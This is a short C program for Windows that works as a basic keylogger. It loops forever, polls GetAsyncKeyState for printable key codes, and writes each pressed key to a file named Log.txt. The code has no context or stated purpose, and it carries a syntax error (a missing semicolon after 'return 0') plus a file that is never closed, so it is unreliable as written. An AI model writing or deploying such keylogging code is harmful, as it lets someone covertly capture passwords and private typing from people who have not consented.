#include <windows.h>
#include <stdio.h>

int main()
{
  int keys;
  FILE *file;
  file = fopen("Log.txt","w");

  while(1)
  {
    for (keys = 32; keys <= 127; keys++)
    {
      if(GetAsyncKeyState(keys) == -32767)
      {
          fprintf(file, "%c",keys);
      }
    }
  }
return 0
}
